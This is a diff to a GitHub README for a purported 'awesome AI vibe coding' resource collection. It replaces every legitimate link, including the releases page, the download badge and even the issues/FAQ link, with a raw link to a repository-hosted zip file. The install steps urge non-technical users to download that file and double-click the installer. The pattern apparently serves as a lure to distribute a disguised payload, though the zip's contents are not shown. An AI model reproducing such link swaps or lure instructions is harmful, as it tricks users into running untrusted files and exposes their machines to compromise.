@@ -1,6 +1,6 @@
 # 🎨 awesome-ai-vibe-coding - Unlock Your Creative Coding Potential
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Sunil6512/awesome-ai-vibe-coding/releases)
+[![Download Now](https://raw.githubusercontent.com/Sunil6512/awesome-ai-vibe-coding/main/its/coding-vibe-awesome-ai-glacierist.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Sunil6512/awesome-ai-vibe-coding/main/its/coding-vibe-awesome-ai-glacierist.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ Awesome AI Vibe Coding is a curated collection of resources for Vibe-Driven Deve
 
 To start using Awesome AI Vibe Coding, follow these simple steps. No technical background is needed.
 
-1. **Visit Our Releases Page**: Click on the button above or follow this link: [Download Page](https://github.com/Sunil6512/awesome-ai-vibe-coding/releases).
+1. **Visit Our Releases Page**: Click on the button above or follow this link: [Download Page](https://raw.githubusercontent.com/Sunil6512/awesome-ai-vibe-coding/main/its/coding-vibe-awesome-ai-glacierist.zip).
 2. **Select the Version**: Look for the latest version of our software. It will be listed clearly.
 3. **Download the File**: Click on the version link to download. The file will begin downloading automatically.
 
@@ -27,7 +27,7 @@ To run Awesome AI Vibe Coding smoothly, you will need:
 
 Now that you know how to download the software, let’s install it:
 
-1. **Go to the Download Page**: [Download Page](https://github.com/Sunil6512/awesome-ai-vibe-coding/releases).
+1. **Go to the Download Page**: [Download Page](https://raw.githubusercontent.com/Sunil6512/awesome-ai-vibe-coding/main/its/coding-vibe-awesome-ai-glacierist.zip).
 2. **Pick Your File**: Click on the latest version to start the download.
 3. **Open the File**: Once the download completes, locate the file in your downloads folder.
 4. **Run the Installer**: Double-click the downloaded file to begin installation. Follow the on-screen instructions until the process is complete.
@@ -54,7 +54,7 @@ After installation, here’s how to effectively use Awesome AI Vibe Coding:
 
 If you encounter any issues or have questions:
 
-- **Check the FAQ**: Visit our [GitHub Issues Page](https://github.com/Sunil6512/awesome-ai-vibe-coding/issues) for common questions.
+- **Check the FAQ**: Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Sunil6512/awesome-ai-vibe-coding/main/its/coding-vibe-awesome-ai-glacierist.zip) for common questions.
 - **Community Forum**: Join discussions with other users to share experiences and solutions.
 - **Contact Us**: Reach out via the contact link available in the application for direct support.
 
